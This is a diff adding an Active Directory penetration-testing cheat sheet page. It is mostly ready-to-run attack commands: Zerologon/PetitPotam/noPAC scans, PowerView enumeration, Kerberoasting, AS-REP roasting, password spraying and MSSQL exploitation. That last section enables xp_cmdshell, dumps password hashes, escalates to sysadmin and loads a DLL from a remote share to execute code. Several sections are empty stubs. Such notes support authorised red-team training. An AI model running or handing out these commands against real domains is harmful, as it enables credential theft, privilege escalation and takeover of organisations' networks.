@@ -1,0 +1,552 @@
+import { Tab, Tabs } from 'nextra-theme-docs'
+ 
+## Scan for vulnerabilities
+```bash filename="Crackmapexec" {2,5,9}
+# Zerologon
+crackmapexec smb <ip> -u '' -p '' -M zerologon
+
+# PetitPotam
+crackmapexec smb <ip> -u '' -p '' -M petitpotam
+
+# noPAC
+# This one needs domain creds
+crackmapexec smb <ip> -u 'user' -p 'pass' -M nopac
+```
+## Enumeration
+
+#### Domain Enumeration
+<Tabs items={['PowerView', 'ADModule']}>
+  <Tab>
+    ```powershell filename="PowerView" {2,5,8}
+      # Get info about the domain
+      Get-NetDomain
+
+      # Get info about other domain (if there is a trust relationship between the 2 domains)
+      Get-NetDomain -Domain domain2.local 
+
+      # List Domain Controllers for another domain
+      Get-NetDomainController -domain domain2.local
+    ```
+  </Tab>
+  <Tab>
+    ```powershell filename="ADModule" {2,5,8,11}
+      # Get info about the domain 
+      Get-ADDomain
+
+      # Get info about other domain (if there is a trust relationship between the 2 domains)
+      Get-ADDomain -Identity domain2.local
+
+      # List Domain Controllers
+      Get-ADDomainController
+
+      # List Domain Controllers for another domain
+      Get-ADDomainController -Identity domain2.local
+    ```
+  </Tab>
+
+ 
+</Tabs>
+
+
+
+
+
+#### Domain Policy Enumeration
+
+Domain Password Policy
+https://www.windows-active-directory.com/active-directory-password-policies.html#:~:text=You%20can%20view%20the%20default%20password%20policy%20using%20one%20of%20two%20ways.&text=Go%20to%20Start%20Menu%20→,policies%20have%20to%20be%20set.
+
+
+<Tabs items={['ADModule', 'CME']}>
+  <Tab>
+    ```powershell 
+      Get-DomainPolicy
+
+      # Get domain policy for system access
+      (Get-DomainPlicy)."system access"  
+      (Get-DomainPlicy)."kerberos policy"
+    ```
+  </Tab>
+  <Tab>
+    ```bash 
+      # Get info about the domain password policy
+      crackmapexec smb DC-IP -u '' -p '' --pass-pol
+    ```
+  </Tab>
+
+ 
+</Tabs>
+
+#### User Enumeration
+##### Un-Authenticated
+```bash filename="Crackmapexec" copy
+# Enumerate usernames without domain credentials using a wordlist of common usernames
+kerbrute  userenum usernames.txt --dc dc-ip -d domain.local  
+```
+##### Authenticated
+<Tabs items={['PowerView', 'ADModule']}>
+  <Tab>
+    ```powershell filename="PowerView"
+      # Get info about a specific user
+      Get-Netuser -username user1
+
+      # To select a specific property
+      Get-NetUser | select -ExpandProperty samaccoutname
+
+
+      # The properties are usesful in defend and detection, or in redteaming to know decoy users and honey credentials used to decieve attackers
+
+      # Get all properties for all domain users
+      Get-UserProperty
+
+      # Shows password last set time
+      Get-UserProperty -Properties pwdlastset
+
+      # Number of bad password entries
+      Get-UserProperty -Properties badpwdcount
+
+      Get-UserProperty -Properties logoncount
+
+      # The Description propertiy sometimes contains cleartext creds, so make sure to have a look on it  
+      Get-UserField -SearchField Description -SearchTerm "built"
+
+      # Get group membership of a user
+      get-NetGroup -Username 'user'
+      ```
+  </Tab>
+  <Tab>
+    ```powershell filename="ADModule"
+    # Get info about current user
+    Get-ADUser -Filter * -Properties *
+
+    # For a specific user
+    Get-ADUser -Identity username -Properties *
+
+    # Get Description property
+    Get-ADUser -Filter 'Description like "*built*"' -Properties Description | select name, Description
+
+    # Get group membership of a user
+    Get-ADPrincipalGroupMembership -Identity username
+    ```
+  </Tab>
+
+ 
+</Tabs>
+
+
+
+
+
+#### User Hunting
+```powershell filename="PowerView"
+# Get active logged-on users on a computer (Note: must have Local Admin privs on that machine)
+Get-NetLoggedOn -ComputerName computer_name
+
+# Get locally logged-on users on a computer (Note: must be local admins, and remote registery must  be runnong on the target [remote registry is started by default])
+Get-LoggedOnLocal -Computername computer_name 
+```
+
+#### Domain Group Enumeration
+
+```powershell filename="PowerView"
+Get-NetGroup  
+Get-NetGroup -domain other_domain  
+Get-NetGroup -Fulldata
+
+# Select only groups with 'admin' in its name 
+Get-NetGroup *admin*  
+Get-NetGroup -gropuname *admin*
+
+# Get data bout specific group
+Get-NetGroup 'group_name' -Fulldata 
+
+# Will show more groups like: **Schecma-Admins, Enterprise-Admins** which are only available on the forest root domain
+Get-NetGroup -domain forest_root_domain
+
+# Get group members
+Get-NetGroupMember -Groupname 'Domain Admins'
+
+# somtimes, groups have other groups as group members, we can specify -Recurse to recursively enumerate all gorups and their subgroups
+Get-NetGroupMember -Groupname 'Domain Admins' -Recurse
+```
+
+
+```powershell filename="ADModule"
+Get-ADGroup -Filter * | select Name  
+Get-ADGroup -Filter * -Properties *  
+Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
+```
+
+#### Local Group Enumeration
+```powershell filename="PowerView"
+Get-NetLocalGroup -Computername computername -ListGroups  
+Get-NetLocalGroup -Computername computername -Recurse
+```
+
+#### Computer  Enumeration
+```powershell filename="PowerView"
+# These commands show only computer domain objects, not the actual machines
+Get-NetLocalGroup -Computername computername -ListGroups  
+Get-NetLocalGroup -Computername computername -Recurse
+
+# Search for  computers running specific OS
+Get-NetComputer -OperatingSystem "*Server 2016"  
+Get-NetComputer | select operatingsystem  
+
+# Check if the machine is live
+Get-DomainComputer -Ping 
+```
+
+```powershell filename="ADModule"
+Get-ADComputer -Filter 'Operating System like"*Server 2016*"' - Properties OperatingSystem | select Name, Operatingsystem  
+Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
+```
+
+#### Shares Enumeration
+```powershell file-path="PowerView"
+# Find all shares in the domain
+Invoke-ShareFinder -Verbose  
+  
+# we can execlude some default shares  
+Invoke-ShareFinder -Verbose -ExcludeStandard -ExecludePrint -ExecludeIPC
+
+# Find sensetive files on computers in domain
+Invoke-FileFinder -Verbose   
+
+# Get all file servers in the domain
+Invoke-NetFileServer
+
+# Find network shares and fileservers
+Find-DomainShare
+Get-DomainFileServer
+```
+
+```powershell
+# List shares on the local host
+net share
+wmic share get /format:list
+
+# List network computers
+net view
+
+# List shares on a remote PC
+net view COMPUTER_NAME /all
+wmic /node: COMPUTER_NAME share get
+
+# List all domain computers and filter all computers with “FILE” in their name
+net group "Domain Computers" /domain | findstr "FILE"
+
+
+
+```
+
+#### GPO Enumeration
+```powershell filename="gpresult-tool"
+# Get all group policies applied to current user or computer
+gpresult /r
+```
+
+```powershell filename="PowerView"
+Get-NetGPO  
+Get-NetGPO -ComputerName computer.domain  
+
+# If a user is made a part of a local group on computer using group policy, then we can enumerate those users using  
+Find-GPOComputerAdmin -ComputerName comptuer.domain  
+  
+# Find computers on which user is made a part of a group using group policy  
+Find-GPOLocation -Username user -Verbose  
+  
+# As we know , GPO's are applied on user or computer OU's , so, we can enumearte GPO's  
+Get-NetOU -OUName 'studentmachines'  
+  
+# List computers in this OU  
+Get-NetOU -OUName 'studentmachines' | %{Get-NetComputer -ADSpath $_}
+```
+
+#### Session  Enumeration
+```powershell filename="PowerView"
+# Get actively logged users on a computer (needs local admin rights on the target)
+Get-NetLoggedon -ComputerName <serverName>
+Get-NetSession  -ComputerName <ops-dc>
+
+# Get locally logged users on a remote computer (needs remote registry on the target - started by-default on server OS)
+Get-LoggedonLocal -ComputerName <serverName>
+
+# Get the last logged user on a computer (needs administrative rights and remote registry on the target)
+Get-LastLoggedOn -ComputerName <servername>
+
+#Find where a specific user is logged in using Powerview:
+Find-DomainUserLocation -UserIdentity USER_NAME
+
+#Find where a group of users are logged in using Powerview:
+Find-DomainUserLocation -UserGroupIdentity GROUP_NAME
+```
+
+#### Administrative Access
+```powershell filename="PowerView"
+# Find all machines on the current domain where the current user has local admin access
+Find-LocalAdminAccess -Verbose
+Get-NetComputer + Invoke-CheckLocalAdminAccess
+
+# Find local admins on all machines of the domain
+Invoke-EnumerateLocalAdmin -Verbose
+
+#Find computers where a domain admin (or specified user/group) has sessions
+Invoke-UserHunter
+Invoke-UserHunter -GroupName "RDPUsers"
+Invoke-UserHunter -CheckAccess
+#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
+Invoke-UserHunter -Stealth
+```
+
+```powershell 
+. .\Find-PSRemotingLocalAdminAccess.ps1  # [[deprecated but still can be found online]]
+Find-PSRemotingLocalAdminAccess
+
+
+# If RPC and SMB are blocked check with WMI
+. .\Find-WMILocalAdminAccess.ps1
+```
+
+
+#### Forest Enumeration
+```
+
+```
+
+## Domain attacks
+
+### Kerberoasting
+<Tabs items={['Rubeus.exe', 'Impacket']}>
+  <Tab>
+    ```powershell 
+      
+    ```
+  </Tab>
+  <Tab>
+    ```bash copy
+      GetUserSPNs.py domain.local/user:P@ssw0rd1 -request -dc-ip 20.20.20.20
+    ```
+  </Tab>
+
+</Tabs>
+
+### AS-Reproasting
+
+<Tabs items={['Rubeus.exe', 'Impacket','Kerbrute']}>
+  <Tab>
+    ```powershell {2,5,8}
+    # From a domain-joined machine
+    .\Rubeus.exe asreproast /outfile:as-reproast-output.txt /format:hashcat
+
+    # For a specific user
+    .\Rubeus.exe asreproast  /format:hashcat /user:webadmin
+
+    # For a list of vulnerable users
+    type .\reproastable-users.txt | .\Rubeus.exe asreproast /user:$_ /format:hashcat
+    ```
+  </Tab>
+  <Tab>
+    ```bash copy
+    # Use domain creds to extract vulnerable users then target them
+    GetNPUsers.py domain.local/username:P@ssw0rd -request -format hashcat -outputfile hashes.asreproast
+
+    # Target list of users
+    GetNPUsers.py -usersfile ./domain_usernames.txt -dc-ip 20.20.20.20 domain.local/ -outputfile as-reproasting.txt -format hashcat
+    ```
+  </Tab>
+  <Tab>
+  ```bash
+  # kerbrute checks for pre-authentication, if doesn't exist it automatically dumps the user hash to crack offline
+  kerbrute userenum usernames.txt --dc dc-ip -d domain.local
+  ```
+  </Tab>
+
+</Tabs>
+
+### Password Spray
+
+<Tabs items={['Kerberos', 'SMB']}>
+  <Tab>
+    ```bash  copy
+    kerbrute  passwordspray -d domain.local --dc dc-ip users.txt 'P@ssw0rd'
+    ```
+  </Tab>
+  <Tab>
+    ```bash copy
+    crackmapexec smb dc-ip users.txt 'P@ssw0rd' 
+    ```
+  </Tab>
+</Tabs>
+
+## Microsoft Services Enumeration and Attacking
+
+#### Microsoft Local Administrator Password Solution (LAPS)
+```
+
+```
+
+
+#### Microsoft SQL Server - MSSQL
+
+##### MSSQL Enumeration
+```powershell filename="PowerUpSQL"
+# Find all local SQL instances
+Get-SQLInstanceLocal -Verbose
+
+# Finding all the SQL instances on a domain
+Get-SQLInstanceDomain -Verbose
+Get-SQLInstanceBroadcast -Verbose
+Get-SQLInstanceScanUDP -Verbose
+
+# get a list of non-default databases from the local server
+Get-SQLInstancelocal | Get-SQLDatabase –Verbose –NoDefaults
+
+# identify a list of SQL Server instances that can be logged into on the domain as the current user
+Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose -Threads 10
+# with a different user
+Get-SQLInstanceDomain  -Verbose -DomainController 192.168.1.1 -Username DOMAIN\user -Password 'P@ssw0rd' | Get-SQLConnectionTestThreaded -Verbose  -Username DOMAIN\user -Password 'P@ssw0rd'
+
+Get snapshot of useful information about your potential target
+Get-SQLServerInfo  #(Currentlogin /IsSysadmin : yes/No)
+Get-SQLInstanceLocal | Get-SQLServerInfo
+Get-SQLServerInfo -Instance "COMPUTER_NAME"
+```
+
+##### MSSQL Exploitation using PowerUpSQL
+```powershell filename="PowerUpSQL"
+# Perform an  audit for common high impact configuration issues // really noisy
+Invoke-SQLAudit -Verbose -Instance "SQLServer1\Instance1"
+
+# attempts to obtain sysadmin privileges using identified vulnerabilities.
+Invoke-SQLEscalatePriv -Verbose -Instance "SQLServer1\Instance1"
+
+# quickly dump databases, privileges, and other information.
+Invoke-SQLDumpInfo -Verbose -Instance "SQLServer1\Instance1"
+# List SQL instances across the domain using default passwords
+Get-SQLInstanceDomain -Verbose | Get-SQLServerLoginDefaultPw -Verbose
+
+#Impersonate the SQL Server service account for the target instance. 
+#-Rev2Self  revert to your original user context with the command below
+Invoke-SQLImpersonateService -Verbose -Instance SQLServer1\Instance1
+
+#pulling SQL Server login password hashes /  -migrate switch to automatically escalate to sysadmin
+#if your executing against a local instance with local administrator privileges.
+Get-SQLServerPasswordHash -Verbose -Instance SQLServer1\Instance1 -Migrate
+```
+
+
+##### SQL Database Enumeration
+```sql filename="SQL"
+--# Version
+SELECT @@version
+
+--# Current User
+SELECT SUSER_SNAME(), SELECT SYSTEM_USER
+
+
+--# Check if current user is sysadmin
+SELECT IS_SRVROLEMEMBER('sysadmin')
+
+--# Current Role
+SELECT user
+
+--# Current database
+SELECT db_name()
+
+--# List all databases
+SELECT name FROM master.. sysdatabases
+
+--# (If below is run  with sysadmin privs more logins are shown)
+--# Alllogins on server
+SELECT * FROM sys.server_principals WHERE type_desc != 'SERVER_ROLE'
+
+--# All database users for a database
+SELECT * FROM sys.database_principals WHERE type_desc != 'DATABASE_ROLE'
+
+--# Listall sysadmin
+SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name ) = 1
+
+--# Effective Permissions for the server
+SELECT * FROM  fn_my_permissions (NULL, 'Server')
+
+--# Effective Permissions for the databse
+SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
+
+--# Active user token
+SELECT * FROM sys.user_token
+
+--# Active login token
+SELECT * FROM sys.login_token
+```
+
+##### SQL Database PrivEsc
+```sql 
+--# User Impersonation - PrivEsc Public to sysadmin
+--# Find SQL Server logins which can be impersonated in the current database
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+
+--# Powerupsql find impersonation privEsc
+Invoke-SQLAuditPrivImpersonateLogin -Instance  instname -Exploit -Verbose
+
+--## TrustWorthy - privEsc public to service Account
+SELECT name as database_name , SUSER_NAME( owner_sid ) AS database_owner, is_trustworthy_on AS TRUSTWORTHY From sys.databases
+
+--# Find trustworthy database using powerupsql
+Invoke-SQLAuditPrivTrustworthy -Instance ops-sqlsrvone -Verbose
+
+--# Command Execution
+--# If xp_cmdshell is uninstalled
+sp_addextendedproc  'xp_cmdshell' , 'xplog70.dll'
+ 
+--# If xp_cmdshell is disabled
+EXEC sp_configure 'show advanced options',1
+RECONFIGURE
+EXEC  sp_configure 'xp_cmdshell',1
+RECONFIGURE
+
+EXEC master.. xp_cmdshell whoami
+
+--# Extended stored procedures
+--# Adding an Extended Stored Procedure
+--# sp_addextendedproc can be used to register the stored procedure. 
+--# Note that the function name in the DLL and the command must exactly be the same (case sensitive)
+
+sp_addextendedproc  'xp_calc ' , 'C:\mydll\xp_calc.dll'
+--# Execute the stored procedure
+EXEC  xp_calc
+
+--# Drop the stored procedure
+sp_dropextendedproc  xp_calc
+
+
+--## Extended stored procedures using powerupsql
+Create SQLFileXpDll -OutFile  C:\temp\xp_calc.dll  -Command  "calc.exe"  -ExportName xp_calc
+Get-SQLQuery   -Instance ins -Query  " sp_addextendedproc 'xp_calc ', '[\\192.168.x.x\fileserver\xp_calc.dll](file://192.168.x.x/fileserver/xp_calc.dll)'  "
+Get-SQLQuery  -Instance ins    -Query "EXEC xp_calc"
+
+```
+
+##### SQL Server Links
+```powershell
+# Enumerate sqlserver links
+Get-SQLServerLink -Instance <MSSQLinstance>
+
+#Server links crawling using powerUPsql
+Get-SQLServerLinkCrawl -Instance <mssqlinstance> -verbose
+
+#Executing commands using powerUpSQL
+Get-SQLServerLinkCrawl -Instance <mssqlinstance> -Query "exec master..xp_cmdshell 'whoami'"
+
+Get-SQLServerLinkCrawl -instance  <mssqlinstance>   | where Instance -ne "Broken Link" |foreach-object { Get-SQLQuery -instance  <mssqlinstance>   -Query (get-SQLServerLinkQuery -Path $_.Path -Sql 'select name from master..sysdatabases') }
+
+# using pure sql openquery() can be used to check for server links
+select * from openquery("sqlServer", 'select * from master..sysservers')
+# using nested link query to  execute commands on server links-- double the single qoutes for each link
+select * from openquery("sqlServer1", ' select * from openquery("sqlServer2",' 'SELECT user' ' ) ')
+
+```
+#### Microsoft Exchange and Outlook Web App
+```
+```
+
